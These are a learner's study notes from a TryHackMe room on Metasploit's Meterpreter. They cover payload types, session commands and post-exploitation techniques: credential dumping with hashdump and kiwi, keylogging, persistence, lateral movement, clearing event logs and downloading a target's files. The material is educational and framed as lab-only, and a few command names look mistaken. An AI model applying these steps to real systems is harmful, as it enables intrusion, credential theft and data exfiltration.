# Room: Metasploit: Meterpreter (TryHackMe)

**Date:** 8 Oct 2025  
**Path:** Cyber Security 101  
**Goal:** Learn Meterpreter basics: available payload flavors, common commands, and post-exploitation techniques using Meterpreter sessions.

## 1. Key Concepts Learned

* **Introduction to Meterpreter**:

  * Meterpreter is an in-memory payload (part of Metasploit) that provides an interactive shell and post-exploitation capabilities without writing a persistent binary to disk.  
  * It runs as a staged payload (stager + stage) or as a single payload and communicates over a network channel (TCP, HTTP(S), or named pipes).

* **Meterpreter Flavors**:

  * **meterpreter (standard)**: default payload providing an interactive session with many extensions.  
  * **reverse_tcp / reverse_https**: callbacks from target to attacker (useful to bypass firewalls/NAT).  
  * **bind_tcp**: target listens for connection from attacker (less common).  
  * **staged vs single**: staged payloads download the larger Meterpreter stage after an initial stager connects; single payloads contain everything inline.  
  * **Platform flavors**: Windows (most feature-rich), Linux, macOS, Android, and variants for different architectures (x86/x64/ARM).

* **Meterpreter Commands**:

  * Session management: `sessions -l`, `sessions -i <id>` to list and interact with sessions.  
  * File ops: `ls`, `cd`, `download`, `upload`, `pwd`, `cat`.  
  * Process and system: `ps`, `getuid`, `sysinfo`, `kill`, `migrate` (move to another process).  
  * Privilege escalation helpers: `getsystime`, `getsystem` (attempt various techniques), and running local exploit modules.  
  * Networking: `portfwd`, `route`, `ipconfig`/`ifconfig`.  
  * Persistence and post-exploitation: `persistence` script, `run autoroute`, `hashdump` (requires privileges), `screenshare`/`screenshot`, `keyscan_start`/`keyscan_dump` (keylogging) where supported.  
  * Extensions: `load kiwi` (mimikatz-like features with appropriate modules), `load incognito` (token manipulation), depending on platform and session type.

* **Post-Exploitation with Meterpreter**:

  * Lateral movement: use `psexec`, `wmiexec`, or `smb`-based techniques coupled with credentials captured via `hashdump` or mimikatz to move to other hosts.  
  * Credential harvesting: `hashdump`, use `load kiwi` or timetable for Mimikatz features to extract credentials (requires privileges).  
  * Data exfiltration: `download` files, use `tunnel`/`portfwd` to pivot, or set up meterpreter as a SOCKS proxy for further tooling.  
  * Covering tracks: clear event logs, remove uploaded artifacts, and prefer in-memory techniques to reduce disk footprint.  
  * Post-exploitation modules: use Meterpreter's `run` scripts and Metasploit post modules to collect credentials, search for interesting files, and gather system information.

## 2. Commands / Tools Practiced (or likely to practice)

* `msfconsole` → `use exploit/...` → `set PAYLOAD windows/meterpreter/reverse_tcp` → `set LHOST` → `exploit`.  
* `sessions -l` / `sessions -i 1` — list and interact with sessions.  
* `meterpreter> sysinfo`, `meterpreter> getuid`, `meterpreter> ps` — gather system/process info.  
* `meterpreter> download C:\Users\target\Documents\secret.docx` — exfiltrate files.  
* `meterpreter> migrate 1234` — migrate to a stable process.  
* `meterpreter> run post/windows/gather/enum_logged_on_users` — example post module run.  
* `meterpreter> run persistence -h` — view persistence script options (lab-only).

## 3. Takeaways

* Meterpreter provides a powerful, in-memory interactive payload with many built-in post-exploitation capabilities — it’s a central tool for Metasploit-based workflows.  
* Different payload transports (reverse vs bind, TCP vs HTTPS) help navigate network constraints and detection.  
* Privilege level matters: many powerful Meterpreter commands require SYSTEM or root privileges.  
* Meterpreter’s modular `run` scripts and extensions make repetitive post-exploitation tasks faster — but they should only be used in safe lab environments and with authorization.

## 4. Next Steps

* Practice spawning Meterpreter sessions in lab VMs and use `sessions` to manage multiple targets.  
* Learn safe migration, persistence techniques (lab-only), and how to use `run` scripts for data collection.  
* Explore Meterpreter extensions (`kiwi`, `incognito`) and their defensive/ethical implications.  
* Study detection techniques used by EDR/AV and how to harden labs to simulate real-world detection and response.
